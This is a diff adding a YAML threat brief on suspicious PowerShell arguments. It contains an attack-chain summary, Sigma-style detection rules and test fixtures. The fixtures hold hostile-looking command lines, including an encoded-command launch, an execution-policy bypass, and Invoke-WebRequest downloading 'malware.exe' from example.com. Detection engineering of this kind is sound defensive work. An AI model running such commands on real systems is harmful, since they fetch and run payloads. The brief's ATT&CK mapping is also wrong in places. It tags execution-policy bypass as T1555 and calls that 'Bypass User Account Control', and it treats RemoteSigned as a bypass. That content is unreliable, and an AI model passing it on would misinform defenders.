@@ -1,0 +1,147 @@
+id: brief-2024-01-09-powershell-susp-args
+slug: 2024-01-powershell-susp-args
+title: Detection of Suspicious PowerShell Arguments
+summary: Detection of suspicious PowerShell arguments used to execute malicious commands or scripts.
+severity: high
+published_at: "2024-01-09T12:00:00Z"
+content: |
+    ## Overview
+
+    This threat brief focuses on detecting suspicious arguments used with PowerShell, a common tool leveraged by adversaries for various malicious activities, including command execution, script deployment, and system compromise. PowerShell's versatility makes it a favorite among attackers, who often obfuscate their intentions by using encoded commands or bypassing execution policies. Defenders need to monitor PowerShell command lines for patterns indicative of malicious behavior.
+
+    ## Attack Chain
+
+    1. An attacker gains initial access via an exploit or social engineering.
+    2. The attacker uses PowerShell to download a malicious script or payload from a remote server using `IWR` or `Invoke-WebRequest`.
+    3. PowerShell attempts to bypass execution policy using parameters like `-ExecutionPolicy Bypass`, `-ep Bypass` or similar variations.
+    4. An encoded command is executed using the `-EncodedCommand` or `-enc` parameter to obfuscate the malicious intent.
+    5. PowerShell is used to inject malicious code into other processes, such as svchost.exe, using techniques like reflective DLL injection.
+    6. PowerShell is used to discover sensitive information, like credentials, on the compromised system using commands like `Get-Credential`.
+    7. PowerShell is used to establish persistence by creating scheduled tasks or modifying registry keys.
+
+    ## Impact
+
+    Successful exploitation via suspicious PowerShell arguments can lead to a variety of outcomes, including data theft, system compromise, and the installation of ransomware. The impact can range from minor disruptions to complete business interruption.
+tags:
+    - powershell
+    - execution
+    - windows
+references:
+    - https://github.com/elastic/detection-rules/blob/main/rules/windows/execution_windows_powershell_susp_args.toml
+rules:
+    - title: Detect PowerShell with EncodedCommand
+      description: Detects PowerShell executions with the -EncodedCommand or -enc parameter.
+      logsource:
+        category: process_creation
+        product: windows
+      detection:
+        condition: selection
+        selection:
+            CommandLine|contains:
+                - -EncodedCommand
+                - -enc
+            Image|endswith: \powershell.exe
+      level: high
+      tags:
+        - attack.execution
+        - attack.t1059.001
+      tests:
+        positive:
+            - name: PowerShell with EncodedCommand argument
+              data:
+                - CommandLine: powershell.exe -EncodedCommand SQBFAFgA...
+                  Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+                  ParentImage: C:\Windows\System32\cmd.exe
+            - name: PowerShell with -enc argument
+              data:
+                - CommandLine: powershell.exe -enc SQBFAFgA...
+                  Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+                  ParentImage: C:\Windows\System32\cmd.exe
+        negative:
+            - name: Normal PowerShell usage without encoded command
+              data:
+                - CommandLine: powershell.exe -File script.ps1
+                  Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+                  ParentImage: C:\Windows\explorer.exe
+    - title: Detect PowerShell Execution Policy Bypass
+      description: Detects PowerShell executions attempting to bypass the execution policy.
+      logsource:
+        category: process_creation
+        product: windows
+      detection:
+        condition: selection
+        selection:
+            CommandLine|contains:
+                - -ExecutionPolicy Bypass
+                - -ep Bypass
+                - -ExecutionPolicy Unrestricted
+                - -ep Unrestricted
+                - -ExecutionPolicy RemoteSigned
+                - -ep RemoteSigned
+            Image|endswith: \powershell.exe
+      level: medium
+      tags:
+        - attack.defense_evasion
+        - attack.t1555
+      tests:
+        positive:
+            - name: PowerShell with ExecutionPolicy Bypass argument
+              data:
+                - CommandLine: powershell.exe -ExecutionPolicy Bypass -File script.ps1
+                  Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+                  ParentImage: C:\Windows\System32\cmd.exe
+        negative:
+            - name: Normal PowerShell usage without execution policy bypass
+              data:
+                - CommandLine: powershell.exe -File script.ps1
+                  Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+                  ParentImage: C:\Windows\explorer.exe
+    - title: Detect PowerShell Downloading Files via Web Request
+      description: Detects PowerShell using Invoke-WebRequest or IWR to download files.
+      logsource:
+        category: process_creation
+        product: windows
+      detection:
+        condition: selection
+        selection:
+            CommandLine|contains:
+                - Invoke-WebRequest
+                - IWR
+            Image|endswith: \powershell.exe
+      level: medium
+      tags:
+        - attack.command_and_control
+        - attack.t1105
+      tests:
+        positive:
+            - name: PowerShell downloading file via Invoke-WebRequest
+              data:
+                - CommandLine: powershell.exe Invoke-WebRequest -Uri http://example.com/malware.exe -OutFile malware.exe
+                  Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+                  ParentImage: C:\Windows\System32\cmd.exe
+            - name: PowerShell downloading file via IWR
+              data:
+                - CommandLine: powershell.exe IWR -Uri http://example.com/malware.exe -OutFile malware.exe
+                  Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+                  ParentImage: C:\Windows\System32\cmd.exe
+        negative:
+            - name: Normal PowerShell usage
+              data:
+                - CommandLine: powershell.exe Get-Process
+                  Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+                  ParentImage: C:\Windows\explorer.exe
+ttps:
+    - tactic_id: TA0002
+      tactic_name: Execution
+      technique_id: T1059.001
+      technique_name: Command and Scripting Interpreter
+      subtechnique_id: T1059.001
+      subtechnique_name: PowerShell
+    - tactic_id: TA0005
+      tactic_name: Defense Evasion
+      technique_id: T1555
+      technique_name: Bypass User Account Control
+    - tactic_id: TA0011
+      tactic_name: Command and Control
+      technique_id: T1105
+      technique_name: Ingress Tool Transfer
